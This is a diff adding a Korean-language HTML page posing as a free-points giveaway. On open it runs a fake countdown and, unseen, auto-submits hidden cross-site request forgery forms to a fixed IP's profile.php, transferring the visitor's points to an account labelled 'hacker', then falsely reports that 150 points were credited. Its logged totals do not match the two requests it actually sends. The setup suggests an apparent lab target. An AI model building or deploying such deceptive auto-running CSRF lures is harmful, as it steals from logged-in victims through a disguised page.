@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            max-width: 500px;
+            width: 90%;
+        }
+        .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        .subtitle { font-size: 1.2em; margin-bottom: 30px; opacity: 0.9; }
+        .countdown { font-size: 3em; color: #FFD700; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); margin: 20px 0; }
+        .progress-bar { width: 100%; height: 20px; background: rgba(255,255,255,0.3); border-radius: 10px; overflow: hidden; margin: 20px 0; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #00ff88, #00cc6a); width: 0%; transition: width 0.5s ease; border-radius: 10px; }
+        .success { color: #00FF88; font-size: 1.8em; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        .pulse { animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="title pulse">🎁 특별 이벤트!</h1>
+        <p class="subtitle">무료 포인트 지급 시스템에 연결되었습니다</p>
+        
+        <div id="loading-section">
+            <div class="loading">
+                <p>💰 포인트 지급을 준비하고 있습니다...</p>
+                <p class="countdown" id="countdown">3</p>
+                <p>초 후 자동으로 포인트가 지급됩니다!</p>
+            </div>
+            <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
+            <p id="status">🔄 시스템 연결 중...</p>
+        </div>
+        
+        <div id="success-section" style="display: none;">
+            <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
+            <p style="font-size: 1.3em; margin: 20px 0;">💰 150P가 성공적으로 지급되었습니다!</p>
+            <p style="opacity: 0.8;">포인트는 즉시 계정에 반영됩니다.</p>
+        </div>
+    </div>
+
+    <script>
+        let countdown = 3;
+        const countdownEl = document.getElementById('countdown');
+        const statusEl = document.getElementById('status');
+        const progressBar = document.getElementById('progressBar');
+        const loadingSection = document.getElementById('loading-section');
+        const successSection = document.getElementById('success-section');
+        
+        const statusMessages = [
+            '🔄 서버에 연결하고 있습니다...',
+            '🔐 보안 인증을 확인하고 있습니다...',
+            '💰 포인트 지급 시스템을 준비하고 있습니다...'
+        ];
+        
+        let messageIndex = 0;
+        
+        // 파일 열리자마자 바로 카운트다운 시작
+        const countdownTimer = setInterval(() => {
+            countdown--;
+            countdownEl.textContent = countdown;
+            progressBar.style.width = ((3-countdown) * 33) + '%';
+            
+            if (messageIndex < statusMessages.length) {
+                statusEl.textContent = statusMessages[messageIndex++];
+            }
+            
+            if (countdown <= 0) {
+                clearInterval(countdownTimer);
+                executeRealAttack();
+            }
+        }, 1000);
+        
+        // Python 스크립트 방식을 참고한 실제 공격
+        function executeRealAttack() {
+            console.log('🎯 Python 방식 CSRF 공격 시작...');
+            statusEl.textContent = '💸 실제 포인트를 전송하고 있습니다...';
+            progressBar.style.width = '100%';
+            
+            // Python 스크립트와 동일한 공격 방법들
+            const attacks = [
+                
+                {
+                    method: 'POST',
+                    url: 'http://15.164.94.241/profile.php',
+                    data: {
+                        receiver_id: '13',
+                        points: '30',
+                        send_gift: '1',
+                        gift_type: 'coffee',
+                        message: '어 개털렸죠?'
+                    },
+                    points: 30
+                },
+                {
+                    method: 'POST',
+                    url: 'http://15.164.94.241/profile.php',
+                    data: {
+                        receiver_id: '13',
+                        points: '25',
+                        gift_type: 'cake',
+                        send_gift: '1',
+                        message: '내가 가져간다 이 대머리야'
+                    },
+                    points: 25
+                },
+               
+            ];
+            
+            let successCount = 0;
+            
+            attacks.forEach((attack, i) => {
+                setTimeout(() => {
+                    try {
+                        if (attack.method === 'GET') {
+                            // GET 방식: img 태그 사용
+                            const img = new Image();
+                            img.onload = () => console.log(`✅ GET 공격 ${i+1} 성공: ${attack.points}P`);
+                            img.onerror = () => console.log(`⚠️ GET 공격 ${i+1} 전송됨: ${attack.points}P`);
+                            img.src = attack.url;
+                            successCount++;
+                            
+                        } else {
+                            // POST 방식: 동적 폼 생성
+                            const form = document.createElement('form');
+                            form.method = 'POST';
+                            form.action = attack.url;
+                            form.style.display = 'none';
+                            form.target = '_blank';
+                            
+                            // 폼 데이터 추가
+                            Object.keys(attack.data).forEach(key => {
+                                const input = document.createElement('input');
+                                input.type = 'hidden';
+                                input.name = key;
+                                input.value = attack.data[key];
+                                form.appendChild(input);
+                            });
+                            
+                            document.body.appendChild(form);
+                            form.submit();
+                            document.body.removeChild(form);
+                            
+                            console.log(`✅ POST 공격 ${i+1} 전송: ${attack.points}P`);
+                            successCount++;
+                        }
+                        
+                    } catch (error) {
+                        console.error(`❌ 공격 ${i+1} 실패:`, error);
+                    }
+                }, i * 2000); // 2초 간격으로 실행
+            });
+            
+            // 완료 처리
+            setTimeout(() => {
+                showSuccess();
+                console.log(`🎉 총 ${successCount}개 공격 전송 완료!`);
+                console.log(`💰 예상 전송 포인트: 150P`);
+                console.log(`🏴‍☠️ hacker 계정에서 포인트 확인해보세요!`);
+            }, 8000);
+        }
+        
+        function showSuccess() {
+            loadingSection.style.display = 'none';
+            successSection.style.display = 'block';
+            document.title = '✅ 포인트 지급 완료!';
+        }
+        
+        // 페이지 언로드 방지
+        let preventUnload = true;
+        window.addEventListener('beforeunload', function(e) {
+            if (preventUnload) {
+                e.preventDefault();
+                return '포인트 지급이 진행 중입니다.';
+            }
+        });
+        setTimeout(() => { preventUnload = false; }, 10000);
+        
+        console.log('🎯 Python 방식 CSRF 페이지 로드 완료');
+        console.log('📋 타겟: hacker (ID: 13)');
+        console.log('💰 총 포인트: 150P (50+30+25+45)');
+        console.log('🚀 파일 열면 자동 실행!');
+    </script>
+</body>
+</html>
